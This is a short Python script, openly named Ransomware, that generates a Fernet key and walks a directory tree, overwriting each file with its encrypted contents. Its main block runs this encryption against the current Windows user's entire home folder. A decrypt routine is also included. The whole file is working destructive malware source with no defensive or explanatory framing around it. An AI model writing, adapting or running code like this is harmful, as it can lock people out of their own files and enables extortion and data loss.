from cryptography.fernet import Fernet
import os, glob, getpass
import sys

class Ransomware:
    def generate_key(self):
        key = Fernet.generate_key()
        with open('encryption.key', 'wb') as f:
            f.write(key)

    def load_key(self):
        return open('encryption.key', 'rb').read()

    def encrypt(self, key, dir):
        for x in os.walk(dir):
            for item in glob.glob(os.path.join(x[0], '*')):
                if os.path.isfile(item):
                    print(f'[+] Encrypting {item}')
                    cryptor = Fernet(key)
                    file = open(item, 'rb')
                    encrypted = cryptor.encrypt(file.read())
                    to = open(item, 'wb')
                    to.write(encrypted)

    def decrypt(self, key, dir):
        for x in os.walk(dir):
            for item in glob.glob(os.path.join(x[0], '*')):
                if os.path.isfile(item):
                    print(f'[+] Decrypting {item}')
                    cryptor = Fernet(key)
                    file = open(item, 'rb')
                    encrypted = cryptor.decrypt(file.read())
                    to = open(item, 'wb')
                    to.write(encrypted)
        

if __name__ == '__main__':
    rw = Ransomware()
    rw.generate_key()
    key = rw.load_key()
    rw.encrypt(key, f'C:\\Users\\{getpass.getuser()}')
